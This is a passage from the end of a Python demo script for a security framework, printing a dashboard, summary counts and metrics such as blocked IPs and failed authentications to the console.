    console.print("\n[bold cyan]📊 Security Dashboard:[/bold cyan]")
    dashboard = security.create_security_dashboard()
    console.print(dashboard)
    
    # Show security summary
    summary = security.get_security_summary()
    console.print(f"\n[bold green]📋 Security Summary:[/bold green]")
    console.print(f"• Recent Incidents (24h): {summary['recent_incidents_24h']}")
    console.print(f"• Active Sessions: {summary['active_sessions']}")
    console.print(f"• Blocked IPs: {summary['blocked_ips']}")
    console.print(f"• Active API Keys: {summary['active_api_keys']}")
    
    return security


async def main():
    """Main entry point for security framework demo."""
    
    try:
        security_framework = await demo_security_framework()
        
        console = Console()
        console.print(f"\n[bold green]✅ Security framework demo completed successfully![/bold green]")
        
        # Show final metrics
        metrics = security_framework.security_metrics
        console.print(f"\n[bold cyan]📊 Security Metrics:[/bold cyan]")
        console.print(f"• Total Incidents: {metrics['total_incidents']}")
        console.print(f"• Blocked Requests: {metrics['blocked_requests']}")
        console.print(f"• Failed Authentications: {metrics['failed_authentications']}")
        console.print(f"• Average Response Time: {metrics['response_time_avg']:.3f}s")
        
    except Exception as e:
        console = Console()
        console.print(f"[bold red]❌ Demo failed: {e}[/bold red]")


if __name__ == "__main__":
    asyncio.run(main())